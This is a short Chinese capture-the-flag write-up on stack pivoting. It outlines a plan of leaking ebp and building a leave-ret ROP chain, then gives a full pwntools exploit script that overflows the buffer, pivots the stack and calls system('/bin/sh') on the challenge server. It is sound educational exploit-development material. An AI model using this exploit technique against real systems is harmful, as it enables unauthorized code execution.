# 挑战简介 
栈空间不够怎么办？

# 思路
这一次要学习的是栈空间不足的情况，所要做的栈迁移  

对于栈迁移，我们要构建好合理的leave—ret利用链  

题目读取两次输入，所以我们的思路如下  
- 修改栈指针（ESP/RSP），将程序执行栈从原位置迁移到攻击者控制的内存区域
- 通过栈溢出配合print泄露ebp地址
- 通过动调来获得ebp相对buf的偏移量，从而计算buf地址
- 进行最终的ROP链构造

```
from pwn import *
context(arch="i386", log_level="debug")

p = remote("pwn.challenge.ctf.show",28118)
elf = ELF('D:\edge 下载\pwn')

system = elf.plt['system']

leave = 0x8048766

offset = 0x27

payload1 = b'a'*offset + b'b'

p.recvuntil("codename:")

p.send(payload1)
p.recvuntil("b")

ebp_addr = u32(p.recv(4))
print(hex(ebp_addr))

buf = ebp_addr - 0x38

binsh = buf + 16

payload2 = b'a'*4 + p32(system) + b'aaaa' + p32(binsh) + b'/bin/sh\x00'
payload = payload2.ljust(0x28, b'a') + p32(buf) + p32(leave)

p.send(payload)

p.interactive()
```
